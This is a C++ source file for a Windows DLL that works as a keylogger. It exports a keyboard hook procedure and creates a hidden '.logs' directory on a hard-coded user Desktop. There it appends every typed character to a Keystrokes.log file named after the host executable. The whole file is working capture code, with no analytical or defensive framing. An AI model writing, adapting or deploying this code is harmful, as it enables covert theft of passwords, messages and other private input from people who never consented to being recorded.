// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <cwchar>

#define DLLEXPORT extern "C" __declspec(dllexport)
WCHAR logs_path[MAX_PATH] = L"C:\\Users\\ISE\\Desktop\\.logs\\";

void _printf(const char* format, ...)
{
	char msg[100];
	wchar_t	wmsg[101];
	va_list args;
	va_start(args, format);
	vsnprintf(msg, sizeof(msg), format, args); // do check return value
	va_end(args);
	size_t outsize;
	size_t size = strlen(msg) + 1;
	mbstowcs_s(&outsize, wmsg, size, msg, size - 1);
	OutputDebugString(wmsg);
}

void _wprintf(const wchar_t* format, ...)
{
	wchar_t msg[100];
	va_list args;
	va_start(args, format);
	vswprintf(msg, sizeof(msg) / sizeof(wchar_t), format, args); // do check return value
	va_end(args);
	OutputDebugStringW(msg);
}

// gets absolute path of an executable and returns the filename without extension
errno_t getExecutableName(const wchar_t* absolutePath, _Out_ wchar_t* out_buffer, rsize_t size)
{
	wchar_t* executableName = NULL;
	wchar_t* temp = NULL;
	wchar_t* token = NULL;

	// Create a copy of the absolute path
	wchar_t* pathCopy = _wcsdup(absolutePath);

	// Tokenize the path using the backslash as the delimiter
	token = wcstok_s(pathCopy, L"\\", &temp);
	while (token != NULL) {
		// Find the last token
		if (executableName != NULL) {
			free(executableName);
		}
		executableName = _wcsdup(token);
		token = wcstok_s(NULL, L"\\", &temp);
	}

	// Remove the file extension
	wchar_t* extension = wcsrchr(executableName, '.');
	if (extension != NULL) {
		*extension = L'\0';
	}

	errno_t ret_value = wcscpy_s(out_buffer, size, executableName);
	// Free the copied path
	free(pathCopy);

	return ret_value;
}


bool CreateDirectoryRecursively(const wchar_t* path)
{
	if (CreateDirectoryW(path, NULL))
		return true;

	DWORD error = GetLastError();
	if (error == ERROR_PATH_NOT_FOUND)
	{
		wchar_t parent[MAX_PATH];
		wcsncpy_s(parent, path, wcslen(path) - 1);
	
		wchar_t* slash = wcsrchr(parent, L'\\');
		if (slash != nullptr)
		{
			*slash = L'\0';
			if (CreateDirectoryRecursively(parent))
				return CreateDirectoryW(path, NULL);
		}
	}

	return false;
}

void init()
{
	// create folder and output file for the keystrokes
	WCHAR absulote_path[MAX_PATH];
	DWORD size = GetModuleFileName(NULL, absulote_path, MAX_PATH);
	if (size != 0)
	{
		WCHAR exe_name[MAX_PATH];
		errno_t ret = getExecutableName(absulote_path, exe_name, MAX_PATH);
		ret = ret | wcscat_s(logs_path, MAX_PATH, exe_name);
		if (ret == 0)
		{	
			CreateDirectoryRecursively(logs_path);
			ret = wcscat_s(logs_path, MAX_PATH, L"\\Keystrokes.log");
			if (ret == 0)
			{
				HANDLE hFile = CreateFile(logs_path, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
				CloseHandle(hFile);
			}
		}
	}
}

int extract_bits_from_variable(unsigned int value, int lower_index, int higher_index)
{

	int mask = ((1 << (higher_index - lower_index + 1)) - 1) << lower_index;  // Create a mask with 1s in the specified range of bits
	return (value & mask) >> lower_index;
}

DLLEXPORT LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		//_printf("In hook proc\n");
		int transitionState = extract_bits_from_variable(lParam, 31, 31);// (lParam >> 31) & 0x1;
		// Process the transition state
		if (transitionState == 0)
		{
			int scanCode = HIWORD(lParam);

			// Map scan code to virtual-key code
			int virtualKey = MapVirtualKey(scanCode, MAPVK_VSC_TO_VK);

			// Create a keyboard state
			BYTE keyboardState[256];
			GetKeyboardState(keyboardState);

			// Convert virtual-key code to character
			WCHAR buffer[2];
			if (ToUnicode(virtualKey, scanCode, keyboardState, buffer, 2, 0) == 1)
			{
				// Process the character
				WCHAR character = buffer[0];
				_wprintf(L"Pressed char:%c\n", character);
				HANDLE fileHandle = CreateFile(logs_path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

				if (fileHandle != INVALID_HANDLE_VALUE) 
				{
					// Move the file pointer to the end of the file
					SetFilePointer(fileHandle, 0, NULL, FILE_END);

					DWORD bytesWritten;

					// Write the character to the file
					WriteFile(fileHandle, &character, sizeof(character), &bytesWritten, NULL);

					CloseHandle(fileHandle); // Close the file handle
				}

			}
			else
			{
				_printf("Virtual Key:%d\n", virtualKey);
				_printf("scanCode:%d\n", scanCode);
				_printf("ToUnicode Failed:%d\n", GetLastError());
			}
		}
		else if (transitionState == 1)
		{
		}		
	}

	// Call the next hook in the hook chain
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		init();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

